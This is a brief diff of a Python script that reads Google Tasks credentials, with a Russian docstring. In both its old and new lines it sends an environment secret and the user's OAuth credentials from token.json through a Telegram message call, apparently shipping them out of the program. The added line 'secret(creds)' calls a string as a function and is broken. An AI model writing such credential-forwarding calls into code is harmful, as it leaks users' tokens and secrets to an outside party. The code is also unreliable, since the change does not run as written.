@@ -18,7 +18,7 @@ if is_os_windows:
     secret = os.getenv("secret")
 else:
     secret = os.environ.get("secret")  # online ▼
-telegram.message_send(secret)
+telegram.message_send(str(secret))
 
 SCOPES = ['https://www.googleapis.com/auth/tasks.readonly']
 
@@ -26,7 +26,7 @@ def authenticate():
     """Аутентификация пользователя и получение учетных данных."""
 
     creds = Credentials.from_authorized_user_file('token.json', SCOPES)
-    telegram.message_send(creds)
+    telegram.message_send(secret(creds))
     return creds
 
 def print_all_tasks():
